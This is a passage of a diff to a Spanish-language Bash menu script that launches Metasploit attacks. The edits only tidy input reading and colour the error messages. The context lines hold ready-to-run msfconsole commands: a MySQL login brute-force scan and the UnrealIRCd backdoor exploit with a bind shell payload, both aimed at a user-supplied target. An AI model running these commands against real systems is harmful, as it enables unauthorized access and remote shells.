 						msfconsole -q -x "use scanner/mysql/mysql_login;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo; run; exit "
 						
@@ -803,8 +850,8 @@ do
 					;;
 					4)#Ataque UnrealIRCD
 						#Definicion de las variables
-						read -p "Especifica la ip objetivo: " ipObjetivo
-						read -p "Especifica el puerto: " puertObjetivo
+						read -rp "Especifica la ip objetivo: " ipObjetivo
+						read -rp "Especifica el puerto: " puertObjetivo
 						#Ataque desde mfconsole
 						msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor ; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo;set payload cmd/unix/bind_ruby;  exploit "
 						
@@ -814,7 +861,7 @@ do
 						break						
 					;;
 					*)
-						echo "ERROR: OPCION NO CONTEMPLADA"
+						echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 						sleep 0.5
 					;;
 				esac
@@ -824,7 +871,7 @@ do
 			exit
 		;;
 		*)
-			echo "Opcion no valida"
+			echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 			sleep 0.5
 		;;
 	esac
